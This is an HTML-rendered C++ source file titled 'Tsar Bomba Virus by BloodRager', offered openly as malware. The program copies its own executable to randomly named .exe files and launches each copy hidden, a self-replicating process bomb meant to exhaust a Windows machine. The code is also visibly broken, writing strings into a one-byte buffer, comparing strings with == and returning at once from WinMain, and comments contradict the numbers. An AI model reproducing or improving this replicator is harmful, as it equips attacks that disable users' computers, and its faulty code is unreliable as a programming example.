<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Tsar Bomba Virus by BloodRager - CPP Source - Tsar.cpp.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc9">#define W32_LEAN_AND_MEAN
#define TSARSTRUCT 1052
#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;time.h&gt;
</span><span class="sc0">
</span><span class="sc2">// character string to generate random filename
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">beg</span><span class="sc10">[</span><span class="sc4">65</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc6">"a"</span><span class="sc10">,</span><span class="sc6">"b"</span><span class="sc10">,</span><span class="sc6">"c"</span><span class="sc10">,</span><span class="sc6">"d"</span><span class="sc10">,</span><span class="sc6">"e"</span><span class="sc10">,</span><span class="sc6">"f"</span><span class="sc10">,</span><span class="sc6">"g"</span><span class="sc10">,</span><span class="sc6">"h"</span><span class="sc10">,</span><span class="sc6">"i"</span><span class="sc10">,</span><span class="sc6">"j"</span><span class="sc10">,</span><span class="sc6">"k"</span><span class="sc10">,</span><span class="sc6">"l"</span><span class="sc10">,</span><span class="sc6">"m"</span><span class="sc10">,</span><span class="sc6">"n"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"o"</span><span class="sc10">,</span><span class="sc6">"p"</span><span class="sc10">,</span><span class="sc6">"q"</span><span class="sc10">,</span><span class="sc6">"r"</span><span class="sc10">,</span><span class="sc6">"s"</span><span class="sc10">,</span><span class="sc6">"t"</span><span class="sc10">,</span><span class="sc6">"u"</span><span class="sc10">,</span><span class="sc6">"v"</span><span class="sc10">,</span><span class="sc6">"w"</span><span class="sc10">,</span><span class="sc6">"x"</span><span class="sc10">,</span><span class="sc6">"y"</span><span class="sc10">,</span><span class="sc6">"z"</span><span class="sc10">,</span><span class="sc6">"A"</span><span class="sc10">,</span><span class="sc6">"B"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"C"</span><span class="sc10">,</span><span class="sc6">"D"</span><span class="sc10">,</span><span class="sc6">"E"</span><span class="sc10">,</span><span class="sc6">"F"</span><span class="sc10">,</span><span class="sc6">"G"</span><span class="sc10">,</span><span class="sc6">"H"</span><span class="sc10">,</span><span class="sc6">"I"</span><span class="sc10">,</span><span class="sc6">"J"</span><span class="sc10">,</span><span class="sc6">"K"</span><span class="sc10">,</span><span class="sc6">"L"</span><span class="sc10">,</span><span class="sc6">"M"</span><span class="sc10">,</span><span class="sc6">"N"</span><span class="sc10">,</span><span class="sc6">"O"</span><span class="sc10">,</span><span class="sc6">"P"</span><span class="sc10">,</span><span class="sc0">
</span><span class="sc6">"Q"</span><span class="sc10">,</span><span class="sc6">"R"</span><span class="sc10">,</span><span class="sc6">"S"</span><span class="sc10">,</span><span class="sc6">"T"</span><span class="sc10">,</span><span class="sc6">"U"</span><span class="sc10">,</span><span class="sc6">"V"</span><span class="sc10">,</span><span class="sc6">"W"</span><span class="sc10">,</span><span class="sc6">"X"</span><span class="sc10">,</span><span class="sc6">"y"</span><span class="sc10">,</span><span class="sc6">"Z"</span><span class="sc10">,</span><span class="sc6">"1"</span><span class="sc10">,</span><span class="sc6">"2"</span><span class="sc10">,</span><span class="sc6">"3"</span><span class="sc10">,</span><span class="sc6">"4"</span><span class="sc10">,</span><span class="sc0">
             </span><span class="sc6">"5"</span><span class="sc10">,</span><span class="sc6">"6"</span><span class="sc10">,</span><span class="sc6">"7"</span><span class="sc10">,</span><span class="sc6">"8"</span><span class="sc10">,</span><span class="sc6">"9"</span><span class="sc10">,</span><span class="sc6">"0"</span><span class="sc10">,</span><span class="sc6">"-"</span><span class="sc10">,</span><span class="sc6">"_"</span><span class="sc0">
</span><span class="sc10">};</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">ret</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">// ret is our control integer
// we will only go through 500 times to save ram.
</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">getpath</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">path</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hinst</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetModuleHandle</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//get our module handle
</span><span class="sc11">GetModuleFileName</span><span class="sc10">(</span><span class="sc11">hinst</span><span class="sc10">,</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc4">1024</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">genfile</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">len</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">25</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">b</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">// generate random number from 1-50
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buff</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">strcpy</span><span class="sc10">(&amp;</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">" "</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">// clear buffer
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">time</span><span class="sc10">(</span><span class="sc5">NULL</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc1">/*This is going to go into 
a non ending loop*/</span><span class="sc0">
</span><span class="sc9">#ifndef TSARSTRUCT
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
</span><span class="sc11">x</span><span class="sc10">++;</span><span class="sc0">
        </span><span class="sc11">b</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">rand</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">%</span><span class="sc0"> </span><span class="sc4">65</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//get random number from 1-85
</span><span class="sc11">strcat</span><span class="sc10">(&amp;</span><span class="sc11">buff</span><span class="sc10">,(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">beg</span><span class="sc10">[</span><span class="sc11">b</span><span class="sc10">]);</span><span class="sc0">
</span><span class="sc2">// concat to the end of the buffer the value of the character
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">x</span><span class="sc10">==</span><span class="sc11">len</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">strcat</span><span class="sc10">(&amp;</span><span class="sc11">buff</span><span class="sc10">,</span><span class="sc6">".exe"</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">strcpy</span><span class="sc10">(&amp;</span><span class="sc11">path</span><span class="sc10">,&amp;</span><span class="sc11">buff</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Atom</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc2">// we will now split the atom!
</span><span class="sc11">ret</span><span class="sc10">++;</span><span class="sc0"> </span><span class="sc2">// increment ret
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">pat</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">pt</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">genfile</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc2">//generate filename
</span><span class="sc11">pt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">pat</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">==</span><span class="sc6">""</span><span class="sc10">)</span><span class="sc0">
   </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc11">pt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">getpath</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc2">// get the path to our file
</span><span class="sc11">CopyFile</span><span class="sc10">((</span><span class="sc11">LPCTSTR</span><span class="sc10">)</span><span class="sc11">pt</span><span class="sc10">,(</span><span class="sc11">LPCTSTR</span><span class="sc10">)</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">// here we copy the file to the random filename generated path
// then we will restart
</span><span class="sc11">ShellExecute</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc6">"open"</span><span class="sc10">,(</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*)</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc11">SW_HIDE</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc2">// this will execute the copied file
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ret</span><span class="sc10">==</span><span class="sc4">500</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc2">//if our shelled number is equal to 500 we will end
</span><span class="sc10">}</span><span class="sc0">




</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">APIENTRY</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc11">LPSTR</span><span class="sc0">     </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0">
                     </span><span class="sc16">int</span><span class="sc0">       </span><span class="sc11">nCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
</span><span class="sc9">#ifdef TSARSTRUCT
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc9">#endif
</span><span class="sc11">Atom</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span></div></body>
</html>
